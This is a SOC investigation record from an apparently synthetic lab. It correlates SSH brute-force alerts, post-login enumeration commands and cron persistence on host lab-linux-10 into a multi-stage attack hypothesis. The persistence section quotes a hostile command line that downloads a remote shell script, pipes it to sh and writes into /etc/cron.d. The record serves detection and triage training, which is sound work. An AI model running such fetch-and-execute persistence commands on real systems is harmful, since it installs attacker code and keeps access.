# CASE-010 — Investigation Record

## 1. Investigation Overview

**Case ID:** CASE-010
**Scenario:** Multi-Stage Attack
**Environment:** Synthetic SOC laboratory
**Investigation Status:** In progress
**Correlation Detection:** DET-CORR-001
**Correlated Alert:** ALERT-CASE-010-DET-CORR-001
**Severity:** Critical
**Confidence:** High

CASE-010 investigates a correlated sequence of three independently generated security detection alerts involving authentication activity, post-authentication privileged/discovery activity, and suspicious Linux cron persistence.

The investigation is based exclusively on synthetic laboratory telemetry and the normalized outputs generated by the CYBERNOVA SOC Detection Engine.

The purpose of the investigation is to determine whether the available evidence supports a coherent multi-stage attack hypothesis and to identify additional validation requirements.

## 4. Stage 1 — Credential Access Activity

Detection:

`DET-AUTH-001 — SSH Brute-Force Authentication Detection`

The underlying telemetry contains six failed SSH authentication attempts against the laboratory host.

Observed failed authentication events:

* `EVT-010001`
* `EVT-010002`
* `EVT-010003`
* `EVT-010004`
* `EVT-010005`
* `EVT-010006`

The detection threshold is five failures within five minutes.

A successful authentication was subsequently observed:

`EVT-010007`

The successful event occurred at:

`2026-09-09T10:02:03Z`

The detection output identifies the source as:

`198.51.100.90`

and the target user as:

`root`

### Analyst Assessment

The evidence establishes repeated failed SSH authentication followed by successful authentication.

This is consistent with the first stage of the CASE-010 attack hypothesis.

The telemetry alone does not establish whether the successful authentication was unauthorized.

## 5. Stage 2 — Post-Authentication Activity

Detection:

`DET-AUTH-003 — Suspicious Post-Authentication Privileged Session`

The successful authentication was followed by a session start and four post-authentication commands.

Observed commands:

1. `whoami`
2. `id`
3. `sudo -l`
4. `uname -a`

Relevant telemetry extends through:

`EVT-010012`

The detection output records:

* six failed authentication attempts;
* successful authentication event `EVT-010007`;
* session start event `EVT-010008`;
* four post-authentication commands;
* privileged indicators associated with `id` and `sudo -l`;
* session ID `SES-010-A`;
* source IP `198.51.100.90`;
* host `lab-linux-10`;
* user `root`.

### Analyst Assessment

The activity demonstrates post-authentication enumeration and privilege-related command execution.

The sequence is temporally consistent with the authentication stage.

These commands can occur during legitimate administration and therefore do not independently prove malicious activity.

## 6. Stage 3 — Persistence Activity

Detection:

`DET-LINUX-001 — Suspicious Linux Cron Persistence Detection`

The persistence detection identified event:

`EVT-010013`

Observed properties include:

* File path: `/etc/cron.d/system-update`
* Process: `bash`
* User: `root`
* Successful persistence-related event
* `curl` download behavior
* shell execution through `sh`
* hidden payload indicator
* cron persistence location

The command line observed in the telemetry is:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

Three independent suspicious indicators were identified:

1. `cron_persistence_path`
2. `shell_download_execution`
3. `hidden_or_tmp_payload`

### Analyst Assessment

The evidence shows activity associated with modifying a cron persistence location and executing downloaded shell content.

This substantially increases the investigative significance of the preceding authentication and post-authentication activity.

However, the detection does not independently establish that the resulting cron configuration executed successfully or that the host was compromised.

## 7. Benign Activity Considered

The source telemetry also contains:

`EVT-010014`

This event represents a successful `crontab -e` operation against:

`/var/spool/cron/crontabs/root`

The event does not satisfy the Linux persistence detection threshold and was not included in the correlated alert.

This provides an example of legitimate scheduled-task administration that must be distinguished from suspicious persistence indicators.
